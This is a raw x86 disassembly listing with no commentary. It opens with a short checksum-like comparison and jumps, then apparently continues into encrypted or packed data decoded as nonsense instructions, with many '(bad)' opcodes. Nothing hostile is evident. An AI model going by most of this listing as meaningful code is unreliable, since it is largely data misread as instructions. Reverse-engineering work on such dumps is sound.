  40fcd6:	shld   edx,eax,0x2
  40fcda:	xor    edx,ecx
  40fcdc:	mov    DWORD PTR [ebp+0xc],edx
  40fcdf:	mov    edx,DWORD PTR [esi]
  40fce1:	shl    eax,0x2
  40fce4:	mov    DWORD PTR [ebp+0x10],edx
  40fce7:	mov    edx,DWORD PTR [esi+0x4]
  40fcea:	xor    eax,0xba699573
  40fcef:	mov    DWORD PTR [ebp+0x14],edx
  40fcf2:	cmp    eax,DWORD PTR [ebp+0x10]
  40fcf5:	jne    0x41195a
  40fcfb:	jmp    0x410285
  40fd00:	shl    BYTE PTR [eax-0x5b],0xd6
  40fd04:	and    eax,0x48609832
  40fd09:	and    dl,ah
  40fd0b:	test   al,0x7a
  40fd0d:	xchg   ebx,eax
  40fd0e:	xchg   edx,eax
  40fd0f:	mov    dl,0x18
  40fd11:	push   0x16
  40fd13:	push   ss
  40fd14:	cmp    eax,0xa8161604
  40fd19:	inc    ebp
  40fd1a:	rcr    ebp,cl
  40fd1c:	add    al,0x27
  40fd1e:	(bad)  
  40fd1f:	stos   DWORD PTR es:[edi],eax
  40fd20:	out    0xa9,al
  40fd22:	das    
  40fd23:	push   esp
  40fd24:	xor    DWORD PTR [ecx-0x5314553c],0xffffffaa
  40fd2b:	jb     0x40fd0c
  40fd2d:	clc    
  40fd2e:	leave  
  40fd2f:	xor    eax,0x628ccbdf
  40fd34:	jne    0x40fce2
  40fd36:	cld    
  40fd37:	or     ah,ah
  40fd39:	xor    ebp,DWORD PTR fs:[ebx+0xf29b995]
  40fd40:	mov    edx,0x675c8fb6
  40fd45:	xlat   BYTE PTR ds:[ebx]
  40fd46:	mov    esi,0x95daf26a
  40fd4b:	xchg   esi,edi
  40fd4d:	fsubrp st(1),st
  40fd4f:	stos   DWORD PTR es:[edi],eax
  40fd50:	mov    esp,0x304d4bcc
  40fd55:	repnz outs dx,BYTE PTR ds:[esi]
  40fd57:	loop   0x40fd04
  40fd59:	mov    DWORD PTR [ecx],edi
  40fd5b:	adc    dl,ah
  40fd5d:	iret   
  40fd5e:	sbb    esi,0x817f0dfc
  40fd64:	adc    al,0xff
  40fd66:	pop    ds
  40fd67:	(bad)  
  40fd68:	das    
  40fd69:	pusha  
  40fd6a:	or     eax,0x49afc398
  40fd6f:	mov    ds,edi
  40fd71:	iret   
  40fd72:	xchg   edi,eax
  40fd73:	ds out 0x63,eax
  40fd76:	or     al,0xda
  40fd78:	lds    esi,FWORD PTR [ecx]
  40fd7a:	sbb    al,0x72
  40fd7c:	pop    ds
  40fd7d:	inc    ebx
  40fd7e:	sbb    eax,0x8d29065b
  40fd83:	mov    cl,0x7c
  40fd85:	jge    0x40fdbc
  40fd87:	clc    
  40fd88:	adc    DWORD PTR [ebx-0x54],edi
  40fd8b:	ins    BYTE PTR es:[edi],dx
  40fd8c:	in     eax,0x50
  40fd8e:	jge    0x40fd27
  40fd90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd91:	pop    eax
  40fd92:	mov    cl,0x5a
  40fd94:	outs   dx,BYTE PTR ds:[esi]
  40fd95:	cld    
  40fd96:	xchg   esi,eax
  40fd97:	imul   ebp,DWORD PTR [edx+0x6],0x65ead2dd
  40fd9e:	push   eax
  40fd9f:	push   DWORD PTR [edi]
  40fda1:	or     dh,bl
  40fda3:	mov    dl,0xf3
  40fda5:	pop    esp
  40fda6:	mov    esi,0xb10c42ad
  40fdab:	cmp    ebp,edi
  40fdad:	sbb    DWORD PTR [edi+edi*1-0x3b269ac5],ebx
  40fdb4:	inc    edx
  40fdb5:	scas   al,BYTE PTR es:[edi]
  40fdb6:	rcr    bh,0xb6
  40fdb9:	pop    es
  40fdba:	imul   eax,esp,0xfffffffb
  40fdbd:	pop    esi
  40fdbe:	pushf  
  40fdbf:	sbb    cl,dl
  40fdc1:	pop    esi
  40fdc2:	pop    ecx
  40fdc3:	xlat   BYTE PTR ds:[ebx]
  40fdc4:	push   esp
  40fdc5:	fs mov bl,0x92
  40fdc8:	add    DWORD PTR [esi],ecx
  40fdca:	outs   dx,BYTE PTR ds:[esi]
  40fdcb:	dec    BYTE PTR [ebx]
  40fdcd:	sbb    al,0x6c
  40fdcf:	lds    ebx,FWORD PTR [edx]
  40fdd1:	mov    dl,0x24
  40fdd3:	sub    al,BYTE PTR [ebx-0x123d67e1]
  40fdd9:	push   edx
  40fdda:	sbb    eax,DWORD PTR [ebx-0x5801e614]
  40fde0:	jg     0x40fe24
  40fde2:	aas    
  40fde3:	ja     0x40fdf1
  40fde5:	push   0x6d6ee6ed
  40fdea:	dec    eax
  40fdeb:	imul   BYTE PTR [eax]
  40fded:	jns    0x40fd74
  40fdef:	sbb    BYTE PTR [edi+0x1a],bl
  40fdf2:	push   edi
  40fdf3:	xchg   edx,eax
  40fdf4:	and    ebp,ebp
  40fdf6:	cmp    BYTE PTR [edx+0x2a],dl
  40fdf9:	ins    DWORD PTR es:[edi],dx
  40fdfa:	popa   
  40fdfb:	mov    al,0xf7
  40fdfd:	dec    eax
  40fdfe:	dec    eax
  40fdff:	fwait
  40fe00:	xchg   esp,eax
  40fe01:	inc    ecx
  40fe02:	mov    cl,0xaf
  40fe04:	test   eax,0x14eb6550
  40fe09:	xchg   ah,cl
  40fe0b:	cmp    eax,0x240a773b
  40fe10:	jge    0x40fe65
  40fe12:	inc    edi
  40fe13:	int    0x29
  40fe15:	push   ecx
  40fe16:	test   DWORD PTR [esi],eax
  40fe18:	mov    ecx,0x8c9ab703
  40fe1d:	inc    esi
  40fe1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe1f:	into   
  40fe20:	and    bh,al
  40fe22:	neg    BYTE PTR [ebx+0x53]
  40fe25:	xor    ah,BYTE PTR [eax+eiz*1]
  40fe28:	add    BYTE PTR [ebp-0x44],ch
  40fe2b:	mov    dh,0x60
  40fe2d:	les    esi,FWORD PTR [ebp+0x6f]
  40fe30:	jmp    0x40fe09
  40fe32:	xor    dl,cl
  40fe34:	fld    TBYTE PTR [edx+0xa375422]
  40fe3a:	dec    esp
  40fe3b:	jle    0x40fe9d
  40fe3d:	rol    BYTE PTR [edi+0x5885a5d6],0xc4
  40fe44:	cmp    esp,edx
  40fe46:	rcl    BYTE PTR [esi],cl
  40fe48:	in     eax,0xc4
  40fe4a:	xchg   esp,eax
  40fe4b:	jno    0x40fdd6
  40fe4d:	push   ebp
  40fe4e:	popa   
  40fe4f:	leave  
  40fe50:	into   
  40fe51:	nop
  40fe52:	jbe    0x40fe25
  40fe54:	sub    ebx,DWORD PTR [esi+ecx*2]
  40fe57:	stc    
  40fe58:	test   al,0x44
  40fe5a:	(bad)  
  40fe5b:	fimul  DWORD PTR [ecx-0x6c]
  40fe5e:	push   0xffffffb2
  40fe60:	data16 add al,0xdd
  40fe63:	add    eax,0xc26f9e38
  40fe68:	in     eax,0x4d
  40fe6a:	int    0xf
  40fe6c:	dec    esp
  40fe6d:	xchg   ecx,eax
  40fe6e:	repnz out dx,al
  40fe70:	push   ecx
  40fe71:	pop    esp
  40fe72:	popa   
  40fe73:	add    eax,0x32f248f5
  40fe78:	or     al,0xcf
  40fe7a:	jmp    FWORD PTR [esi-0x28]
  40fe7d:	mov    dh,0xd
  40fe7f:	and    eax,0x174a221a
  40fe84:	icebp  
  40fe85:	jo     0x40fe91
  40fe87:	clc    
  40fe88:	push   cs
  40fe89:	and    ebx,DWORD PTR [edx-0x6e]
  40fe8c:	pop    eax
  40fe8d:	and    dl,0x3b
  40fe90:	jge    0x40fe88
  40fe92:	or     dh,cl
  40fe94:	xchg   BYTE PTR [esi+0x1aaa1572],dl
  40fe9a:	xchg   BYTE PTR [edi+0x5d],dh
  40fe9d:	lock xchg esp,eax
  40fe9f:	das    
  40fea0:	sahf   
  40fea1:	sub    DWORD PTR [ebx],esi
  40fea3:	std    
  40fea4:	retf   
  40fea5:	cdq    
  40fea6:	or     al,0xca
  40fea8:	jno    0x40febe
  40feaa:	popa   
  40feab:	sbb    eax,0xffffffe8
  40feae:	aaa    
  40feaf:	cmp    BYTE PTR [edi],ah
  40feb1:	cmp    BYTE PTR [edi+edx*8+0x63],0x19
  40feb6:	aas    
  40feb7:	ja     0x40feb4
  40feb9:	and    al,BYTE PTR [edx]
  40febb:	daa    
  40febc:	pushf  
  40febd:	pop    ds
  40febe:	mov    ah,0x59
  40fec0:	gs pop edi
  40fec2:	adc    esi,eax
  40fec4:	inc    edi
  40fec5:	outs   dx,DWORD PTR ds:[esi]
  40fec6:	jbe    0x40fefb
  40fec8:	out    dx,al
  40fec9:	sbb    ah,ah
  40fecb:	rcl    DWORD PTR [ecx],0xe8
  40fece:	xchg   esi,eax
  40fecf:	add    ecx,DWORD PTR ss:[eax]
  40fed2:	mov    ch,0xb6
  40fed4:	lahf   
  40fed5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fed6:	test   al,0x84
  40fed8:	mov    cl,bl
  40feda:	adc    eax,0xd466e3ae
  40fedf:	das    
  40fee0:	arpl   di,sp
  40fee2:	outs   dx,BYTE PTR ds:[esi]
  40fee3:	inc    ebx
  40fee4:	xor    ebx,DWORD PTR [ebp-0x1382243c]
  40feea:	rol    BYTE PTR [ebx-0x3072e45f],cl
  40fef0:	add    ch,bl
  40fef2:	mov    eax,ds:0x6ce639e0
  40fef7:	shr    DWORD PTR [edi+0x1f79d145],1
  40fefd:	cld    
  40fefe:	push   0x2473282b
  40ff03:	push   ebp
  40ff04:	outs   dx,BYTE PTR ds:[esi]
  40ff05:	icebp  
  40ff06:	fsubr  QWORD PTR [edx-0x6c]
  40ff09:	pop    edi
  40ff0a:	hlt    
  40ff0b:	push   ss
  40ff0c:	mov    DWORD PTR [ecx+0x75],esp
  40ff0f:	push   esi
  40ff10:	pop    edi
  40ff11:	mov    bl,0x60
  40ff13:	ins    BYTE PTR es:[edi],dx
  40ff14:	mov    al,0x4f
  40ff16:	int3   
  40ff17:	ret    0x5223
  40ff1a:	pop    esi
  40ff1b:	imul   edx,edx,0xffffffeb
  40ff1e:	jmp    0x40ff97
  40ff20:	arpl   WORD PTR [ebp*1+0x7704bc9a],bp
  40ff27:	int3   
  40ff28:	add    edi,esi
  40ff2a:	imul   esi,DWORD PTR [edx+ebp*8-0x10f25892],0xffffff87
  40ff32:	mov    ebx,0x5a92e9c7
  40ff37:	push   es
  40ff38:	sub    al,ch
  40ff3a:	sahf   
  40ff3b:	jns    0x40ff7d
  40ff3d:	out    0x46,al
  40ff3f:	aas    
  40ff40:	inc    ebp
  40ff41:	or     DWORD PTR [ebx-0x35855ec1],ebp
  40ff47:	int    0x3d
  40ff49:	jb     0x40ff01
  40ff4b:	xchg   ecx,eax
  40ff4c:	jo     0x40ff6f
  40ff4e:	es loope 0x40ff7f
  40ff51:	dec    edx
  40ff52:	cli    
  40ff53:	push   ecx
  40ff54:	das    
  40ff55:	dec    esp
  40ff56:	add    DWORD PTR [ebp+edi*4-0x4ac9c2ce],ecx
  40ff5d:	mov    ch,0x70
  40ff5f:	bound  ebp,QWORD PTR [ecx+0x66f3566c]
  40ff65:	push   es
  40ff66:	pusha  
  40ff67:	mov    ah,0x70
  40ff69:	je     0x40ff76
  40ff6b:	sahf   
  40ff6c:	jp     0x40ff0b
  40ff6e:	xchg   ecx,eax
  40ff6f:	inc    esi
  40ff70:	lock cdq 
  40ff72:	mov    ds:0xd70a25d4,eax
  40ff77:	adc    DWORD PTR [ebp-0x7b],esi
  40ff7a:	repnz or edi,DWORD PTR [edi+ebx*8]
  40ff7e:	sbb    al,ah
  40ff80:	adc    ah,al
  40ff82:	inc    ebp
  40ff83:	fbstp  TBYTE PTR [edi]
  40ff85:	arpl   WORD PTR [ebx],si
  40ff87:	inc    ebx
  40ff88:	mov    edx,0xab442f36
  40ff8d:	outs   dx,DWORD PTR ds:[esi]
  40ff8e:	dec    esp
  40ff8f:	fbstp  TBYTE PTR [edi-0x26478962]
  40ff95:	pop    ebp
  40ff96:	jne    0x40ff98
  40ff98:	loope  0x40ff2e
  40ff9a:	sbb    eax,DWORD PTR [edi]
  40ff9c:	ror    bl,1
  40ff9e:	jno    0x41000a
  40ffa0:	sub    DWORD PTR [esi+ebp*1],edi
  40ffa3:	popw   es
  40ffa5:	pop    es
  40ffa6:	sub    BYTE PTR [ebx],dl
  40ffa8:	push   edx
  40ffa9:	push   edx
  40ffaa:	xchg   ebx,eax
  40ffab:	cmp    DWORD PTR ds:0xd6a0ead0,esp
  40ffb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffb2:	popa   
  40ffb3:	es sahf 
  40ffb5:	pop    eax
  40ffb6:	ss dec esp
  40ffb8:	cld    
  40ffb9:	and    eax,0x3a19775e
  40ffbe:	and    al,0xc4
  40ffc0:	aas    
  40ffc1:	sub    al,0xaf
  40ffc3:	std    
  40ffc4:	inc    ecx
  40ffc5:	loope  0x410014
  40ffc7:	les    ebp,FWORD PTR [ecx]
  40ffc9:	or     DWORD PTR [esi+0x1d2b645d],edi
  40ffcf:	push   0x118001d6
  40ffd4:	fs sub BYTE PTR fs:[esi],ch
  40ffd8:	aam    0x4f
  40ffda:	xor    BYTE PTR [edi+0x3cb6afec],cl
  40ffe0:	jmp    0x410041
  40ffe2:	mov    BYTE PTR [ecx],bl
  40ffe4:	shl    BYTE PTR [ebx+0x62a6388c],1
  40ffea:	stc    
  40ffeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffec:	rcr    edi,0xc6
  40ffef:	neg    ah
  40fff1:	in     al,0xba
  40fff3:	jg     0x40ff7c
  40fff5:	cmp    eax,0xd5fd5673
  40fffa:	stc    
  40fffb:	ret    0x5c7a
  40fffe:	mov    ds:0xb2fec134,al
  410003:	mov    al,0x93
  410005:	test   BYTE PTR [ebp+0x47dbde8b],cl
  41000b:	sbb    DWORD PTR [esi+0x31],edi
  41000e:	adc    eax,0x4e32e623
  410013:	push   esp
  410014:	mov    edi,DWORD PTR [eax-0x3e4d7e63]
  41001a:	pop    DWORD PTR [ecx-0x5a]
  41001d:	addr16 mov eax,ds:0x2b3e
  410021:	jp     0x410065
  410023:	in     al,dx
  410024:	cmp    cl,ah
  410026:	imul   ecx,DWORD PTR [esi-0x5f],0x28
  41002a:	jne    0x40ffdc
  41002c:	mov    al,BYTE PTR [edi-0x3]
  41002f:	fxch   st(2)
  410031:	or     al,0x9c
  410033:	mov    esi,0x23b996e0
  410038:	sub    bh,dl
  41003a:	fadd   DWORD PTR [esi]
  41003c:	(bad)  
  41003e:	pop    ebp
  41003f:	xchg   DWORD PTR [ecx+0x37],esi
  410042:	jl     0x41007f
  410044:	adc    BYTE PTR [ecx-0x29],ah
  410047:	test   BYTE PTR [edx],cl
  410049:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41004a:	aas    
  41004b:	loop   0x4100aa
  41004d:	gs mov bl,0xa8
  410050:	out    dx,eax
  410051:	mov    ah,0x76
  410053:	sar    BYTE PTR [edx+0x5c],1
  410056:	adc    al,0xc5
  410058:	stos   BYTE PTR es:[edi],al
  410059:	retf   0x71a4
  41005c:	outs   dx,BYTE PTR es:[esi]
  41005e:	sub    eax,0xa27dce9a
  410063:	fld    QWORD PTR [ecx+0x41]
  410066:	mul    DWORD PTR [ebp-0x531bcc77]
  41006c:	mov    BYTE PTR [esi],cl
  41006e:	ret    
  41006f:	inc    esp
  410070:	and    ah,ah
  410072:	cmp    DWORD PTR [ecx],ecx
  410074:	test   al,0xb4
  410076:	adc    BYTE PTR [ebx],0x4f
  410079:	pop    eax
  41007a:	xchg   esi,eax
  41007b:	ins    BYTE PTR es:[edi],dx
  41007c:	xchg   edx,eax
  41007d:	push   ds
  41007e:	inc    esi
  41007f:	cli    
  410080:	fcomp  st(2)
  410082:	jl     0x4100f9
  410084:	dec    edx
  410085:	std    
  410086:	fbld   TBYTE PTR [edi+0x26]
  410089:	sub    eax,0xe3d80079
  41008e:	std    
  41008f:	jge    0x4100cd
  410091:	push   cs
  410092:	mov    bh,0x81
  410094:	pop    edi
  410095:	out    0x33,al
  410097:	mov    BYTE PTR [ebx-0x1bdd4b7e],cl
  41009d:	push   eax
  41009e:	fild   WORD PTR [ebx]
  4100a0:	outs   dx,BYTE PTR ds:[esi]
  4100a1:	sbb    al,0xa4
  4100a3:	mov    ds:0xdba897fb,al
  4100a8:	adc    esp,esi
  4100aa:	sub    ebx,DWORD PTR [ebx-0xc]
  4100ad:	ret    
  4100ae:	push   edi
  4100af:	lea    ecx,[ecx-0x1c]
  4100b2:	xchg   ebp,eax
  4100b3:	sbb    ah,BYTE PTR [ecx]
  4100b5:	fld    DWORD PTR [ebx-0xf01ecf7]
  4100bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100bc:	(bad)  
  4100be:	mov    al,ds:0x89e5a1e0
  4100c3:	push   edi
  4100c4:	loopne 0x41011e
  4100c6:	sbb    al,0xf4
  4100c8:	jae    0x4100b2
  4100ca:	rcl    BYTE PTR [eax-0x10],0x66
  4100ce:	rcl    DWORD PTR [ebx+0x28],0x42
  4100d2:	mov    eax,0xdd517a67
  4100d7:	sub    eax,0xd04a7478
  4100dc:	dec    esi
  4100dd:	enter  0x184,0x7d
  4100e1:	mov    eax,ds:0x766f1162
  4100e6:	int3   
  4100e7:	lahf   
  4100e8:	push   eax
  4100e9:	sbb    BYTE PTR [edx-0x38afb05d],dh
  4100ef:	je     0x410156
  4100f1:	js     0x41016a
  4100f3:	shr    DWORD PTR [ebp-0x3a],0x11
  4100f7:	push   es
  4100f8:	xchg   esp,eax
  4100f9:	and    edx,DWORD PTR [esi+0x66]
  4100fc:	int3   
  4100fd:	fisub  DWORD PTR [eax-0x64]
  410100:	inc    esp
  410101:	inc    esp
  410102:	mov    dh,0xaa
  410104:	out    0x3e,al
  410106:	mov    esi,DWORD PTR [eax+ebp*1-0x3c]
  41010a:	aas    
  41010b:	add    al,0x2c
  41010d:	mov    ebx,gs
  41010f:	push   ebx
  410110:	jp     0x410141
  410112:	mov    ebp,0xef8e7846
  410117:	and    eax,DWORD PTR [esi]
  410119:	pop    edi
  41011a:	or     eax,0x2bfbf090
  41011f:	or     DWORD PTR [ebx+0x30],ebx
  410122:	dec    ebp
  410123:	retf   
  410124:	retf   
  410125:	jl     0x4100ec
  410127:	pop    ebp
  410128:	dec    edi
  410129:	jae    0x41016c
  41012b:	std    
  41012c:	dec    ecx
  41012d:	shl    cl,0x7f
  410130:	mov    esi,0x6b274b2e
  410135:	mov    ah,0x9
  410137:	xor    al,0xf0
  410139:	xchg   edi,eax
  41013a:	and    edx,DWORD PTR [ebx+0x5471c119]
  410140:	in     eax,0x2d
  410142:	adc    DWORD PTR [edi],edi
  410144:	js     0x41010c
  410146:	sbb    BYTE PTR [esi-0x545d4aa9],ch
  41014c:	(bad)  
  41014d:	test   al,0xdb
  41014f:	push   ds
  410150:	mov    DWORD PTR [edi],ebx
  410152:	(bad)  [ebx-0x6e6a4f00]
  410158:	inc    edx
  410159:	mov    ecx,0x60ec6a8f
  41015e:	mov    ax,0xbc1f
  410162:	xchg   DWORD PTR [edi-0xffbbbe9],esp
  410168:	icebp  
  410169:	aas    
  41016a:	sti    
  41016b:	ss and ebp,0x1febf28
  410172:	mov    cl,0x41
  410174:	popf   
  410175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410176:	pushf  
  410177:	pusha  
  410178:	cmp    BYTE PTR [eax-0x22faafa1],0x9
  41017f:	push   0x10
  410181:	pop    edi
  410182:	hlt    
  410183:	sub    bl,bh
  410185:	dec    esp
  410186:	mov    gs,WORD PTR [ecx+0x36]
  410189:	add    ecx,DWORD PTR [edi+ebx*4-0x4a]
  41018d:	push   es
  41018e:	mov    eax,ds:0xc24c53c8
  410193:	sub    al,0xc9
  410195:	jge    0x4101e5
  410197:	cli    
  410198:	add    dh,dh
  41019a:	mov    eax,ds:0x41239425
  41019f:	adc    cl,ah
  4101a1:	dec    ecx
  4101a2:	les    edi,FWORD PTR [esp+ebx*8]
  4101a5:	and    eax,0xf6f99778
  4101aa:	xor    BYTE PTR [eax+0x3577b85a],ch
  4101b0:	adc    DWORD PTR [edx],eax
  4101b2:	scas   al,BYTE PTR es:[edi]
  4101b3:	adc    ch,BYTE PTR [ebx-0x41b6c231]
  4101b9:	lods   eax,DWORD PTR ds:[esi]
  4101ba:	mov    esi,0x329ff207
  4101bf:	add    edx,DWORD PTR [ebx]
  4101c1:	(bad)  
  4101c2:	cld    
  4101c3:	mov    ch,0x54
  4101c5:	(bad)  
  4101c6:	sbb    esi,DWORD PTR [edx+0x7a9fb4de]
  4101cc:	or     al,0x8e
  4101ce:	inc    eax
  4101cf:	mov    ecx,0xe11f46ef
  4101d4:	imul   esp,DWORD PTR [ecx-0x6dc748f9],0x3e
  4101db:	sub    DWORD PTR [ebx],edx
  4101dd:	push   ebp
  4101de:	(bad)  
  4101df:	hlt    
  4101e0:	push   eax
  4101e1:	push   ebp
  4101e2:	pop    ds
  4101e3:	jnp    0x4101ab
  4101e5:	sbb    cl,ch
  4101e7:	dec    edx
  4101e8:	dec    ecx
  4101e9:	rcr    ch,0xb9
  4101ec:	fs jmp 0x2530f519
  4101f2:	arpl   WORD PTR [ebx-0x3c394082],dx
  4101f8:	stos   DWORD PTR es:[edi],eax
  4101f9:	mov    al,ds:0x52270c10
  4101fe:	btr    DWORD PTR [ebp+0x14],esp
  410202:	leave  
  410203:	gs (bad) 
  410206:	mov    dl,0x41
  410208:	sub    eax,0x5e1b9541
  41020d:	dec    ecx
  41020e:	out    0x34,eax
  410210:	lea    ebp,[eax+0xc]
  410213:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410214:	out    dx,eax
  410215:	adc    al,0x9a
  410217:	jmp    0xc654:0xfcfb3b10
  41021e:	imul   ebp,DWORD PTR [ebp+0x3c],0xfffffff7
  410222:	fdiv   DWORD PTR [ebx]
  410224:	push   ds
  410225:	rcl    DWORD PTR [ecx+0x502b46cd],cl
  41022b:	cmc    
  41022c:	jle    0x410242
  41022e:	push   0xfffffff3
  410230:	addr16 xchg esi,eax
  410232:	pop    es
  410233:	iret   
  410234:	sub    eax,0x367efdc4
  410239:	fdivp  st(0),st
  41023b:	mov    es,WORD PTR gs:[esi+0x3bd82fa7]
  410242:	add    ax,0x345f
  410246:	rcr    BYTE PTR [ecx],1
  410248:	leave  
  410249:	fcom   DWORD PTR [esi]
  41024b:	cmp    dh,dl
  41024d:	je     0x4101d6
  41024f:	and    esp,DWORD PTR [ebp+0x7a]
  410252:	(bad)  
  410253:	fisttp DWORD PTR [edi-0x110606c9]
  410259:	in     eax,dx
  41025a:	xchg   edx,eax
  41025b:	je     0x4102c9
  41025d:	add    eax,0x28033465
  410262:	aam    0x9a
  410264:	mov    eax,ds:0x740f78ba
  410269:	mov    gs,WORD PTR [edi-0xf09a0ad]
  41026f:	adc    eax,0xcdea8a44
  410274:	stos   BYTE PTR es:[edi],al
  410275:	pop    esp
  410276:	(bad)  
  410277:	pop    ebx
  410278:	scas   al,BYTE PTR es:[edi]
  410279:	jnp    0x41029b
  41027b:	loopne 0x410256
  41027d:	loop   0x410228
  41027f:	mov    WORD PTR [ecx],ds
  410281:	pop    eax
  410282:	ins    DWORD PTR es:[edi],dx
  410283:	arpl   WORD PTR [edx-0x75],bx
  410286:	ret    0x4539
  410289:	or     al,0xf
  41028b:	test   edx,ecx
  41028d:	push   ss
  41028e:	add    BYTE PTR [eax],al
  410290:	mov    eax,DWORD PTR [esi]
  410292:	mov    edx,DWORD PTR [esi+0x4]
  410295:	mov    eax,DWORD PTR [esi]
  410297:	mov    edx,DWORD PTR [esi+0x4]
  41029a:	mov    edx,eax
  41029c:	jmp    0x410826
  4102a1:	shr    esi,cl
  4102a3:	ror    dh,cl
  4102a5:	shl    BYTE PTR [edx-0x1e636d6d],cl
  4102ab:	loopne 0x410321
  4102ad:	sbb    BYTE PTR [edi-0x2c],0xa8
  4102b1:	inc    edi
  4102b2:	pushw  ss
  4102b4:	push   ss
  4102b5:	cmp    eax,0x9161604
  4102ba:	xor    al,0xf1
  4102bc:	adc    eax,0xf4a4cb8c
  4102c1:	add    al,0x8f
  4102c3:	mov    ebp,0x3118d59d
  4102c8:	dec    esi
  4102c9:	adc    ah,BYTE PTR [ecx-0x48]
  4102cc:	dec    esp
  4102cd:	mov    eax,0xaf8e14ec
  4102d2:	(bad)  
  4102d3:	and    al,0x69
  4102d5:	jno    0x4102fb
  4102d7:	xchg   BYTE PTR [ebx],ah
  4102d9:	fidiv  DWORD PTR [eax]
  4102db:	bound  ecx,QWORD PTR ds:0xd0d2d5f8
  4102e1:	sub    al,0x7e
  4102e3:	or     DWORD PTR [ebx-0x5cb30d19],esi
  4102e9:	pop    eax
  4102ea:	les    ebx,FWORD PTR [edi-0x2]
  4102ed:	test   BYTE PTR [ebx+0x7f],0x9
  4102f1:	fdiv   QWORD PTR [edi]
  4102f3:	push   ebx
  4102f4:	cdq    
  4102f5:	inc    ecx
  4102f6:	xchg   ecx,eax
  4102f7:	scas   eax,DWORD PTR es:[edi]
  4102f8:	shr    DWORD PTR [eax-0x1c4379e4],cl
  4102fe:	jmp    0x410299
  410300:	aas    
  410301:	xchg   ebx,eax
  410302:	adc    BYTE PTR [esi-0xf],bl
  410305:	and    BYTE PTR [edi+0x53],cl
  410308:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410309:	out    0xc3,eax
  41030b:	xor    dh,BYTE PTR [ebx-0x14]
  41030e:	sub    edi,DWORD PTR [edx]
  410310:	pop    ds
  410311:	fisttp DWORD PTR [ebp+0x55c9cb11]
  410317:	nop
  410318:	and    dl,ch
  41031a:	mov    dl,0xa2
  41031c:	pop    ebp
  41031d:	dec    esp
  41031e:	inc    eax
  41031f:	fwait
  410320:	push   ss
  410321:	icebp  
  410322:	sbb    eax,0x84c89d6
  410327:	xor    eax,0x235d6bb9
  41032c:	aaa    
  41032d:	push   0x82a1493d
  410332:	ss mov ecx,0xda7cce1
  410338:	fld    DWORD PTR [edi-0x3867819]
  41033e:	scas   eax,DWORD PTR es:[edi]
  41033f:	mov    eax,0xa0696b52
  410344:	sbb    DWORD PTR [eax-0x5c995714],0xb2654bdf
  41034e:	inc    ecx
  41034f:	ret    
  410350:	sbb    ch,dl
  410352:	cs adc al,0xf
  410355:	outs   dx,BYTE PTR ds:[esi]
  410356:	ficomp DWORD PTR [esi-0x48d85f31]
  41035c:	popa   
  41035d:	es not edi
  410360:	popa   
  410361:	aad    0x6c
  410363:	pop    eax
  410364:	les    ecx,FWORD PTR [edx+0x33]
  410367:	loop   0x410342
  410369:	scas   eax,DWORD PTR es:[edi]
  41036a:	jmp    0xdef6:0xbe67676d
  410371:	test   eax,0xb8f6d3b3
  410376:	test   edi,0x6e39de58
  41037c:	cs test eax,0x30404721
  410382:	pop    edi
  410383:	scas   eax,DWORD PTR es:[edi]
  410384:	lea    ebx,[edi+0x413e43ca]
  41038a:	repz cmp dl,BYTE PTR [eax]
  41038d:	add    eax,0x46f44fb
  410392:	loope  0x4103d4
  410394:	lds    ecx,FWORD PTR [edi]
  410396:	sbb    BYTE PTR [esi+eax*2+0x57],ah
  41039a:	dec    edx
  41039b:	dec    esi
  41039c:	push   ecx
  41039d:	shl    BYTE PTR ss:[esi-0xd17db90],cl
  4103a4:	enter  0x7727,0x4a
  4103a8:	or     eax,0x40e400bd
  4103ad:	mov    ch,0x16
  4103af:	jl     0x410383
  4103b1:	xor    al,0xc8
  4103b3:	push   edx
  4103b4:	dec    dh
  4103b6:	je     0x410344
  4103b8:	out    dx,al
  4103b9:	ret    
  4103ba:	sub    esp,DWORD PTR [ebx]
  4103bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103bd:	sub    dl,dh
  4103bf:	or     ecx,DWORD PTR [edi+esi*2-0x58]
  4103c3:	fs cmp eax,0x703bbef
  4103c9:	sub    dl,BYTE PTR [eax+0x13fba8ba]
  4103cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103d0:	inc    ecx
  4103d1:	cmp    ecx,edx
  4103d3:	dec    esp
  4103d4:	jle    0x4103f8
  4103d6:	mov    ebp,ecx
  4103d8:	dec    ebp
  4103d9:	dec    eax
  4103da:	pop    ebx
  4103db:	pop    esp
  4103dc:	loopne 0x410409
  4103de:	or     ebp,ebp
  4103e0:	dec    ecx
  4103e1:	cmp    eax,0xe48946aa
  4103e6:	push   ebp
  4103e7:	ret    0xeaf8
  4103ea:	and    BYTE PTR [eax+0x1861868a],ch
  4103f0:	and    cl,ah
  4103f2:	shr    ah,cl
  4103f4:	stos   DWORD PTR es:[edi],eax
  4103f5:	sbb    eax,0xf4139424
  4103fa:	inc    edi
  4103fb:	in     al,0xf5
  4103fd:	mov    bl,BYTE PTR [eax]
  4103ff:	mov    esp,eax
  410401:	pop    esp
  410402:	xor    ebx,ebx
  410404:	jmp    0x6fb6de2c
  410409:	in     eax,0xeb
  41040b:	mov    al,ds:0x963fdb
  410410:	sub    ebx,0x4a9d27ab
  410416:	sbb    edi,edx
  410418:	lods   eax,DWORD PTR ds:[esi]
  410419:	push   0x33
  41041b:	dec    ebx
  41041c:	push   ss
  41041d:	and    dl,BYTE PTR [ebp-0x262e2260]
  410423:	pusha  
  410424:	mov    bl,0x4f
  410426:	rcl    DWORD PTR [esi-0x5634ea78],1
  41042c:	add    eax,0x96d9a461
  410431:	sbb    DWORD PTR [ebx-0x2852132],esp
  410437:	adc    eax,0x996cf339
  41043c:	mov    ch,BYTE PTR [ecx+eiz*4]
  41043f:	xchg   BYTE PTR [edx+ebp*4-0x7],dl
  410443:	ss loop 0x41044e
  410446:	repnz dec ebp
  410448:	in     eax,0x5f
